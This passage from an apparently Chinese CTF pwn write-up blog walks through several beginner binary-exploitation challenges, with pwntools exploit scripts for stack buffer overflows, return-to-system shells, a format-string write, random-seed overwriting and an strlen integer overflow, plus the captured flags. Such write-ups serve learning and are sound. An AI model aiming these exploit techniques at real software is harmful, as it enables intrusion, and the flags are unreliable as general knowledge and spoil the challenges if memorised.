src="https://ae01.alicdn.com/kf/He37eee47b4cb4bcc9b6f0f5ce3be9a19P.jpg" alt></p><p>61616161就是我们要找的值，a的ascii的值的16进制格式，可以看到偏移量是10；</p></li><li><p>接下来就是把这个地方改成pwnme的地址（0x0804A068）,然后用%n对pwnme赋值为8即使printf输出8个字符 -&gt; <code>p32() 转换为4字节 + ‘aaaa’4字节 = 8 字节</code>，构造exp：<img src="https://pic.superbed.cn/item/5d730a8b451253d178b4e92c.jpg" alt></p></li><li><p>这就得到了答案，这里我还不明白的使写的这个exp使如何给pwnme赋值的？？？？？</p></li><li><p>感谢这位博主的<a href="https://blog.csdn.net/qq_43394612/article/details/85196669" target="_blank" rel="noopener">文章</a>,  帮了很大忙。</p><ul><li>输入一个<code>地址</code>+<code>补足字符串</code>+<code>%10$n</code> = <code>串A</code>，执行<code>printf</code>函数的时候<code>串A</code>的首地址会存入栈中的一个位置，即偏移量10，<strong>看到有位博主说：输入的字符串的前4个字节如果是一个有效的字符串的首地址，就可以用%s将其打印出来</strong>，也就是说如果是<strong>地址+串</strong>那么便会将这个地址作为这个串的首地址。这样子便实现了将我们的<code>pwnme</code>的地址作为串的首地址存入到栈中。之后我们在将其输出便会输出这个串A，而我们在串尾使用了%10$n又取到这个首地址并将其值赋为输出的字符数。</li><li>感觉应该就是这样，终于理解啦，哈哈哈哈哈哈哈哈哈哈哈哈哈哈。搞了一天，终于明白了，加油啊^_^。</li></ul></li></ul><h2 id="when-did-you-bord"><a href="#when-did-you-bord" class="headerlink" title="when_did_you_bord"></a>when_did_you_bord</h2><p><code>只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办</code></p><h3 id="基操-1"><a href="#基操-1" class="headerlink" title="基操"></a>基操</h3><ul><li><p>查看文件信息， 没有开启PIE(一种可执行文件的属性，相当于可执行文件的保护机制)<a href="[https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/](https://introspelliam.github.io/2017/09/30/linux程序的常用保护机制/)">关于可执行文件保护机制的介绍</a></p><p><img src="https://ae01.alicdn.com/kf/H8d89e82cdd48455ca4de99d5c6333cc68.jpg" alt></p></li><li><p>运行一下  ，发现就是让我们输入生日和姓名，然后输出我们的信息</p><p><img src="https://ae01.alicdn.com/kf/Hab69db1576774589b401d0e2d64ff127L.jpg" alt></p></li><li><p>放到IDA里看看</p><p><img src="https://ae01.alicdn.com/kf/Ha5b1dec9896943148c5e34a4572ffc24q.jpg" alt></p></li></ul><h3 id="分析过程-1"><a href="#分析过程-1" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>发现只要将v5的值修改为1926便会输出flag，我们可以利用栈溢出，使v4溢出从而实现对v5值的修改，查看v4和v5的位置</p><p><img src="https://ae01.alicdn.com/kf/Hee77e09116c14ac49482634f807512bc2.jpg" alt></p></li><li><p>可以看到v4占了8字节，下面便是v5，只要让v4溢出的部分修改v5为1926即可</p></li><li><p>利用下面的代码实现溢出</p><pre class="line-numbers language-python"><code class="language-python">  <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"55616"</span><span class="token punctuation">)</span>  a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?"</span><span class="token punctuation">)</span>  a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>  a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?"</span><span class="token punctuation">)</span>  a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>得到falg<br><img src="https://ae01.alicdn.com/kf/H6714011bd89445a1a0091c03d364b17bC.jpg" alt></p></li><li><p>答案：<code>cyberpeace{54fc1533fefdce65285602c7ad5ab774}</code></p></li></ul><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p><code>pwn！，segment fault！菜鸡陷入了深思</code></p><h3 id="基操-2"><a href="#基操-2" class="headerlink" title="基操"></a>基操</h3><ul><li><p>查看文件信息，文件属性：64位，没有开启PIE。</p><p><img src="https://ae01.alicdn.com/kf/H1b75f9cbe9794c3ab3c3c478c40d3af1L.jpg" alt></p></li><li><p>运行一下，看不出一点信息，giao</p><p><img src="https://ae01.alicdn.com/kf/H4f1a35c06b024bdf99d214fd588fa012U.jpg" alt></p></li><li><p>再用IDA看一下</p><p><img src="https://ae01.alicdn.com/kf/Haac1b846e45d4c64b874ad270da9b07cq.jpg" alt></p></li></ul><h3 id="分析过程-2"><a href="#分析过程-2" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>好像什么也看不出来，对于我这只小白来说，但是呢第九行他就是执行<code>cat flag</code>的, 大佬nb，接下来当然是查看变量的位置啦</p><p><img src="https://ae01.alicdn.com/kf/H73e7e547d2cb4ccd9e6e6f861b102da2M.jpg" alt></p><p>巧了，输入的那个和最后执行判断语句的那个是挨着的，利用内存溢出不就可以对后者进行赋值了吗，和上一题一样</p></li><li><p>直接上exp：</p><ul><li><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"35001"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1853186401</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof\n"</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行代码返回结果</p><p><img src="https://ae01.alicdn.com/kf/H7060e8019d064297a2169d5215a473aci.jpg" alt></p></li></ul></li><li><p>答案 <code>cyberpeace{1c15d7a71ed08427b1c638a78f8ab206}</code></p></li></ul><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p><code>菜鸡了解了什么是溢出，他相信自己能得到shell</code></p><h3 id="基操-3"><a href="#基操-3" class="headerlink" title="基操"></a>基操</h3><ul><li><p>看看文件信息，没有开 canary，PIE 也是关闭的，但是栈不可执行。也就是说我们可以进行溢出，但是不能将 shellcode 写在栈上，因为现在栈上的代码是不能被执行的<img src="https://ae01.alicdn.com/kf/H43d4cce511e247c28f5448df350185e4C.jpg" alt></p></li><li><p>跑一下，就输出了一个hello word，嗯。。。。。</p><p><img src="https://ae01.alicdn.com/kf/Hc211307f822b4c708b1bce5fbab30869P.jpg" alt></p></li><li><p>IDA看一看</p><p><img src="https://ae01.alicdn.com/kf/Hdbe32acc81ea42b19cfb48f2adcea787t.jpg" alt></p></li></ul><h3 id="分析过程-3"><a href="#分析过程-3" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>找漏洞</p><p>main函数没什么东西，发现不了什么，接着找<code>vulnerable_function</code></p><p><img src="https://ae01.alicdn.com/kf/Hf0fe327496694e32b6fc7dc78d074e1av.jpg" alt></p><p>好像也没有什么，没办法，都看看吧</p><p><img src="https://ae01.alicdn.com/kf/H0848ea9d7746407ab1d3c156e0dcbdb2Y.jpg" alt></p><p>发现这个名为callsystem的函数应该就是用于返回shell的，没错就是它了，去吧比卡丘，就决定是你啦。</p></li><li><p>接下来的目的就是想办法执行这个函数，接下啦我这个真正的小白就什么也不会了，学吧</p><ul><li><p>想要执行这个函数，就要在函数调用返回的时候修改eip（<a href="https://blog.csdn.net/chenlycly/article/details/37912755" target="_blank" rel="noopener">eip是啥</a>），进行<a href="https://blog.csdn.net/linyt/article/details/48738757" target="_blank" rel="noopener">rop</a>攻击。</p></li><li><p>首先还是需要寻找溢出点， <code>vulnerable_function</code>中的read函数存在缓冲区溢出漏洞。</p></li><li><p>查看变量地址， ida告诉我们r代表的就是return address</p><p><img src="https://ae01.alicdn.com/kf/Hb268c696049848818d9e09f844523adaX.jpg" alt></p><p>发现buf的首地址和栈上的返回地址的距离是： (+0x0000000000000008 ) - (-0x0000000000000080 ) = 0x88, 也就是说buf的大小只有128（0x88）,我们只要将128填满，再将溢出的那部分进行操作即可</p></li><li><p>接着找到<code>callsystem</code>函数的地址， 地址为<code>0x400596</code></p><p><img src="https://ae01.alicdn.com/kf/H59858b0cc6404edcac7791b62016597e6.jpg" alt></p></li><li><p>接着构建exp，</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">30046</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行代码，返回结果</p><p><img src="https://ae01.alicdn.com/kf/H88117b6277e64eea94e9d53939a7d133H.jpg" alt></p><p>执行代码，进入shell，所以还要进行一些交互才能获取结果。</p></li></ul></li><li><p>答案：<code>cyberpeace{fabe8b6d58bfb06bac3e72bd26525a35}</code></p></li></ul><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><code>菜鸡请教大神如何获得flag，大神告诉他‘使用</code>面向返回的编程<code>(ROP)就可以了</code></p><h3 id="基操-4"><a href="#基操-4" class="headerlink" title="基操"></a>基操</h3><ul><li><p>查看文件信息，32位的文件，还是没有开启PIE，canary没有找到，但是呢NX这项保护是开启的状态，这意味着：栈中数据没有执行权限，常用的call esp或者jmp esp的方法在这里就不能使用辽，但是可以利用rop这种方法绕过</p><p><img src="https://ae01.alicdn.com/kf/H7e503aa92f714d0c84caebf10d513be5x.jpg" alt></p></li><li><p>运行一下，没什么收获</p><p><img src="https://ae01.alicdn.com/kf/Hb78b6d120cef49699920316517d34d7dD.jpg" alt></p></li><li><p>扔进IDA看看</p><p>main函数没什么特别的</p><img src="https://ae01.alicdn.com/kf/H9f1ae1742a8646978f5d5afb833768e7e.jpg"></li></ul><h3 id="分析过程-4"><a href="#分析过程-4" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li>但是嗯，vulnerable_function()的read函数好像存在堆栈溢出点，emmmm，</li></ul><p><img src="C:%5CUsers%5CMAIBENBEN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1568118181710.png" alt="1568118181710"></p><ul><li><p>接下来就是要想办法找到调用shell的函数的地址。<code>shift + f12</code> 查看字符串</p><img src="https://ae01.alicdn.com/kf/H6cc08f53526a4a58a456589ce1215578I.jpg"><p>有点东西，一个是system，还有一个就是/bin/sh, 接下来要做的就是想办法调用system(“/bin/sh”);</p></li><li><p>计算一下偏移量 </p><img src="https://ae01.alicdn.com/kf/Hf3dc0afa670842b182117d1d44a7e04aY.jpg"><img src="https://ae01.alicdn.com/kf/Hf5aacacfe3404f97b17f536766a17bd3L.jpg"><p>偏移量 = 0x4 + 0x88</p></li><li><p>找到<code>system</code>函数于字符串<code>&quot;/bin/sh&quot;</code>的地址，今天我才知道，原来可以直接使用python 的pwn库直接获取地址，之前都是用IDA自己手动找的。哼，giao</p></li><li><p>构建exp,  方案：构造一个system(“/bin/sh”)的伪栈帧，然后通过控制vulnerable_function() 函数返回到该伪栈帧执行system(“/bin/sh”)来get shell。</p><p>把system以及bin/sh构造进payload<br>payload = ‘a’ * (0x88 + 0x4) + p32(sys_addr) + p32(0) + p32(bin_addr)<br>其中p32(0)为system(“/bin/sh”)执行后的返回地址，整上个0就能行。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./level2"</span><span class="token punctuation">)</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'111.198.29.45'</span><span class="token punctuation">,</span> <span class="token number">47650</span><span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># get the address of the function</span>bin_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># get the address of the string</span>payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行的到结果</p><img src="https://ae01.alicdn.com/kf/H0143a7e3225c46a2a10312f1f312d617A.jpg"></li><li><p>对函数栈的理解：函数地址+返回地址+-变量地址，， 纯属小白理解，勿信。</p><p>我们实际上是使用我们需要的函数地址对能够执行函数的返回地址进行了覆盖，实际上函数的返回地址本身也是其他函数的地址，一个函数执行结束后便会执行返回地址所指向的函数。</p></li><li><p><a href="https://blog.csdn.net/wangyezi19930928/article/details/16921927" target="_blank" rel="noopener">函数调用栈的讲解</a>这个博客写的挺好的。</p></li></ul><h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p><code>菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么</code></p><h3 id="基操-5"><a href="#基操-5" class="headerlink" title="基操"></a>基操</h3><ul><li><p>查看一下文件信息，64位文件，开启了PIE，没有开启RELRO保护</p><p><img src="https://ae01.alicdn.com/kf/H21c0a5f2fbb54210b4757c497db808c5H.jpg" alt></p><p>之前没有介绍过这几个属性的含义，这里补上</p><ul><li><code>RELRO</code>: RELocation Read-Only, 重定向只读，可以防止GOT表被修改，这里没有开启这个保护，所以我们可以修改GOT表，来替换函数原本的功能。</li><li><code>Stack</code>: 栈溢出检查，用<code>Canary</code>金丝雀值是否变化来检测,<code>Canary found</code>表示开启。</li><li><code>NX</code>: No Execute，栈不可执行，windows上的DEP。</li><li><code>PIE</code>: position-independent executables, 位置无关的可执行文件，也就是常说的<code>ASLR</code>(Address space layout randomization) 地址随机化， 程序每次启动基址都随机，所以一旦开启这个，就要想办法得到程序基址。</li></ul></li><li><p>运行一下，猜数字？？？？</p><p><img src="https://ae01.alicdn.com/kf/H69049b06618e48ce91f751a9360b1f6dD.jpg" alt></p></li><li><p>丢到ida里看看</p><p><img src="https://ae01.alicdn.com/kf/Hcae44846fcb7469b82b55637eb42b454o.jpg" alt></p><p>就是一直判断，不相等就退出程序，好像没有特殊的语句，但是循环结束后又运行了一个函数<code>sub_C3E</code>, 有点东西，查看函数</p><p><img src="https://ae01.alicdn.com/kf/H3408191ec5204f7ca43af61c143af613d.jpg" alt></p><p>是我们想要的了，接下来只要想办法让程序执行这个函数即可</p></li></ul><h3 id="分析过程-5"><a href="#分析过程-5" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>本来想要看看是不是和上一题一样，利用函数栈溢出来实现，但是后来发现，并没有函数栈溢出点，并且函数使用的是伪随机数，并且伪随机数的种子我们可以利用栈溢出<code>v8</code>来进行覆盖，那我们便可以直接获取到与程序相等的随机数，10次判断之后便可以获取到flag了。</p></li><li><p>void srand(unsigned seed); //srand函数是随机数发生器的初始化函数</p><p>int rand(void);                      //rand函数是用来产生伪随机数的</p><p>seed的作用：srand函数根据参数seed，设置一个随机起点，而rand根据这个起点产生随机数序列。默认的seed为1，如果seed一样，则rand产生的随机数序列也一样。</p></li><li><p>查看偏移量</p><p><img src="https://ae01.alicdn.com/kf/H38c50baaaf5944569f471dc142198922Q.jpg" alt></p><p>v8就是var_30,   有惊喜，看到了seed， 那就没错了，溢出之后刚好覆盖seed[0],  可以看到偏移量位0x20。</p></li><li><p>构建exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span> <span class="token number">30760</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>c <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#注意如果输出的方法是printf，那么如果源码中没有\n那就不要在exp中写成name:\n，否则会出现问题</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your guess number:"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://ae01.alicdn.com/kf/Ha9d58f7628684603a69185a72494e515R.jpg" alt></p></li><li><p>答案：<code>cyberpeace{c5b84e1b00f05c2161748e7c9376c9cc}</code></p></li><li><p>总结：伪随机数的绕过，根本还是栈溢出</p></li></ul><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p><code>菜鸡认为自己需要一个字符串</code></p><h3 id="基操-6"><a href="#基操-6" class="headerlink" title="基操"></a>基操</h3><ul><li><p>查看文件信息，32位，PIE没开启，可执行栈。</p><p><img src="https://ae01.alicdn.com/kf/H96c612402c1646a0b122398c137c067fF.jpg" alt></p></li><li><p>运行一下  </p></li></ul><p><img src="https://ae01.alicdn.com/kf/Hcd12006561944279a577f0f11425d4ef4.jpg" alt></p><ul><li><p>丢带IDA里看看</p><p><img src="https://ae01.alicdn.com/kf/Hf4c4f2d7a55b432986cfcad84d17c7ceC.jpg" alt></p></li></ul><h3 id="分析过程-6"><a href="#分析过程-6" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li>main函数里面什么没有，看看hello(), 函数，发现新大陆</li></ul><p><img src="https://ae01.alicdn.com/kf/Hdb861e194f2248c3bc013543829cd1aaj.jpg" alt></p><ul><li>执行的语句几乎都在hello()函数里面，看了一下，gets函数又有溢出漏洞，下面需要寻找执行system的语句，找到了pwn()函数</li></ul><p><img src="https://ae01.alicdn.com/kf/H6ca467dd48114015a260ed864117d22eB.jpg" alt></p><ul><li>发现参数不是我们想要的”/bin/sh”, 接下来只要想办法将这个参数换成我们想要的就行了，搜索了一下程序中不存在我们想要的”/bin/sh“字符串，但是程序运行时我们输入了name变量的值，并且name是全局变量（bss起始），只要输入时将”/bin/sh“赋值给name， 再将name直接传给system()函数就行了。name的地址为<code>0x0804A080</code>。</li></ul><p><img src="https://ae01.alicdn.com/kf/H33167c3201e64185833602627a06bee9v.jpg" alt></p><ul><li><p>计算溢出的偏移量</p><p><img src="https://ae01.alicdn.com/kf/Hbfb1a7c5cb2141829fa8806a91ca4c6aX.jpg" alt></p><p><img src="https://ae01.alicdn.com/kf/H63433f30e5b043b29b771ad9640747f4D.jpg" alt></p><p>偏移量：<code>0x26+0x4</code></p></li><li><p>写exp：<code>p32(0)</code> 为函数的返回地址，随便写个就行 如：”a”。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">35295</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"../mid_file/cgpwn2"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x26</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804A080</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name\n'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><p><img src="https://ae01.alicdn.com/kf/H587997d596b24a2c822b47171e9a8b5ej.jpg" alt></p></li><li><p>答案：<code>cyberpeace{1787e3b5ba74de671adcb64a147fb41f}</code></p></li><li><p>emmmm，这道题算自己写的吧，开始有点套路了，加油呀   []<del>(￣▽￣)</del>*。</p></li></ul><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><code>菜鸡感觉这题似乎没有办法溢出，真的么?</code></p><h3 id="基操一波"><a href="#基操一波" class="headerlink" title="基操一波"></a>基操一波</h3><ul><li><p>查看文件信息，32为文件，PIE没开启，栈溢出检测没有</p><p><img src="https://ae01.alicdn.com/kf/He81f24dd70344f59b1d5a4fde8f4c7a8O.jpg" alt></p></li><li><p>运行一下</p><p><img src="https://ae01.alicdn.com/kf/Hc7b3c08f116e403fa6c7d2a7e81f61c9P.jpg" alt></p><p>没啥特殊的信息。</p></li><li><p>丢到IDA里看看，波。</p><p>main()函数里面没什么东西，顺着函数调用找也没有找到什么东西。但是呢把所有函数翻了一遍发现个有用的东西</p><p><img src="https://ae01.alicdn.com/kf/H9dadaa604e9c4db99d7415d25e8bda8ba.jpg" alt></p><p>接下来就是要想办法找到溢出点来，调用这个函数</p></li></ul><h3 id="分析过程-7"><a href="#分析过程-7" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>寻找溢出点</p><p>从main()函数找到了login()函数，login()函数也没有溢出漏洞，接着从login()函数找到了check_passwd()函数。check_passwd() 是首先获得 s （buf）的长度，将长度赋值给v3。那如果s特别的长，获取长度后赋值的过程中是不是就会溢出？</p><p><img src="https://ae01.alicdn.com/kf/H29254c1d7db74fbaa5ef88ca769f0027D.jpg" alt></p></li><li><p>strlen()函数存在漏洞，因为32位程序中strlen把结果的返回值给8位寄存器al，8位也就是意味着最大值位255，如果大于255便会溢出，如果输入了261，即<code>‭‭‭000100000101‬</code>那么最后的值便会是<code>00000101‬</code>也就是5。而为了让函数最后的返回到what_is_this()的地址，我们还需要的是找到一个函数栈的溢出点，而在结束判断后执行的strcpy()函数中的参数dest的长度为0x14+0x4</p></li></ul><p><img src="https://ae01.alicdn.com/kf/Hd50bbf27ad8645c38a87901048e7b2a0d.jpg" alt></p><p>构造：payload = （0x14+0x4）+ (指定的函数地址) +  int(216) - (前两个的int型的长度和)</p><ul><li><p>构建exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">49689</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"../mid_file/int_overflow"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x14</span><span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"what_is_this"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">261</span><span class="token operator">-</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your username:"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"nibaba"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please input your passwd:"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><p><img src="https://ae01.alicdn.com/kf/Haa7ef0fcd6a14e71a8b3e6bb73996956O.jpg" alt></p></li><li><p>答案：<code>cyberpeace{ec636b5014e64952866313bacbb8e113}</code></p></li><li><p>总结吧，又有了新的收获，strlen函数的溢出漏洞可以用来突破字符个数的限制以执行下面的程序，从而对下面的程序进行别的溢出，例如函数栈的溢出，构造伪栈帧等。</p></li></ul><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><code>菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求</code></p><h3 id="基操-7"><a href="#基操-7" class="headerlink" title="基操"></a>基操</h3><ul><li><p>查看文件基本信息：64位文件，PIE没有打开，栈溢出检查开启了。</p><p><img src="https://ae01.alicdn.com/kf/Hae4173d7d313410b98722cc91af55b59p.jpg" 